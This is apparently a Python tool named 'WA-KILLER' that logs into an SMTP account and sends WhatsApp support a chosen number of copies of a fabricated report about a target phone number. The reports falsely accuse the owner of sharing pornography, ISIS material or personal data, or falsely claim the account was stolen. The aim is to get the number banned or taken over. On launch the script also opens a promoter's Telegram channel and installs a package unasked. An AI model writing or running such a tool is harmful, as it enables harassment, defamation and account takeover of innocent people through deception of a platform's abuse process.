from os import system , name
system('cls || clear')
system('pip install colorama')
system('cls || clear')
from email.message import EmailMessage
from datetime import datetime as date
from colorama import Fore as color
from random import choice
from time import sleep
import smtplib as sl
import webbrowser as web
if name == 'nt':
    web.open('https://t.me/D4RK_ARMY')
else:
    web.open('https://t.me/D4RK_ARMY')
    system('xdg-open https://t.me/D4RK_ARMY')
def SlowPrint(txt):
    for x in txt:
        print(x, end='', flush=True)
        sleep(0.01)
    print()
banner = F'''
{color.RED}
██╗    ██╗ █████╗       ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
██║    ██║██╔══██╗      ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
██║ █╗ ██║███████║█████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
██║███╗██║██╔══██║╚════╝██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
╚███╔███╔╝██║  ██║      ██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝

{color.RED}[+]{color.WHITE} DEVELOPER : T.ME/N3RGAL
{color.RED}[+]{color.WHITE} TELEGRAM CHANNEL : T.ME/D4RK_ARMY

'''
print(banner)
sleep(0.1)
mail = input(f'''{color.RED}┏━[{color.LIGHTGREEN_EX}WA-KILLER{color.LIGHTBLUE_EX}~{color.WHITE}@YOUR-EMAIL{color.RED}]
┗━━━{color.WHITE} 卍 ''')
passwd = input(f'''{color.RED}┏━[{color.LIGHTGREEN_EX}WA-KILLER{color.LIGHTBLUE_EX}~{color.WHITE}@PASSWORD{color.RED}]
┗━━━{color.WHITE} 卍 ''')
target = input(f'''{color.RED}┏━[{color.LIGHTGREEN_EX}WA-KILLER{color.LIGHTBLUE_EX}~{color.WHITE}@TARGET-NUMBER{color.RED}]
┗━━━{color.WHITE} 卍 ''')
count = input(f'''{color.RED}┏━[{color.LIGHTGREEN_EX}WA-KILLER{color.LIGHTBLUE_EX}~{color.WHITE}@REPORT-COUNT{color.RED}]
┗━━━{color.WHITE} 卍 ''')
server = input(f'''{color.RED}┏━[{color.LIGHTGREEN_EX}WA-KILLER{color.LIGHTBLUE_EX}~{color.WHITE}@SMTP-SERVER{color.RED}]
┗━━━{color.WHITE} 卍 ''')
port = input(f'''{color.RED}┏━[{color.LIGHTGREEN_EX}WA-KILLER{color.LIGHTBLUE_EX}~{color.WHITE}@SMTP-PORT{color.RED}]
┗━━━{color.WHITE} 卍 ''')
system('cls || clear')
print(f'''
{banner}

[1] - Immoral Actions
[2] - Stolen Account

''')
report_type = input(f'''{color.RED}┏━[{color.LIGHTGREEN_EX}WA-KILLER{color.LIGHTBLUE_EX}~{color.WHITE}@REPORT-TYPE{color.RED}]
┗━━━{color.WHITE} 卍 ''')
immoralAcctionsMsg = [f'this user is sharing immoral content & pornographic videos , please ban it as soon as possible , phone number : {str(target)}',f'This user shares ISIS beliefs & many horrible videos of killing the humans , please block it as soon as possible , phone number : {str(target)}',f'this user is sharing people personal information & data in chats amd groups, please ban it as soon as possible, phone number is : {str(target)}']
stolenAccountMsg = (f'This number ( {str(target)} ) account has been stolen. I want to go into my WhatsApp account , but the SIM card is not in front of me to get the code number and enter my account , Please help me. I had many friends and acquaintances in this account. Please return my account as soon as possible. Thank you')
sleep(0.3)
SlowPrint(f'{color.LIGHTGREEN_EX}\n[!] Starting ...\n')
try:
    email = EmailMessage()
    email['from'] = mail
    email['to'] = 'support@support.whatsapp.com'
    if report_type == '1':
        email['subject'] = 'Immoral Actions Report'
    elif report_type == '2':
    	email['subject'] = 'Stolen Account Report'
    if report_type == '1':
        email.set_content(choice(immoralAcctionsMsg))
    elif report_type == '2':
    	email.set_content(stolenAccountMsg)
    else:
        print(f'{color.RED}[!]{color.WHITE} Error , select a valid option (1/2)')
        exit()
    with sl.SMTP(host=server, port=port) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login(mail,passwd)
        for i in range(1,int(count)+1):
            now = date.now()
            Current_time = now.strftime('%H:%M:%S')
            smtp.send_message(email)
            print(f'[{Current_time}] {color.WHITE}WA-KILLER Report Result : {color.LIGHTGREEN_EX}True')
except KeyboardInterrupt:
    print(f'{color.RED}[-] {color.WHITE}Opration Canceled By User')
    exit()
except sl.SMTPAuthenticationError:
    print (f'{color.RED}[!] {color.WHITE}The email address , password or smtp server address / port you entered is incorrect.')
    exit()
except Exception as error:
    now = date.now()
    Current_time = now.strftime('%H:%M:%S')
    print(f'''
[{Current_time}] {color.WHITE}WA-KILLER Report Result : {color.RED}False

Error Description : {error}''')
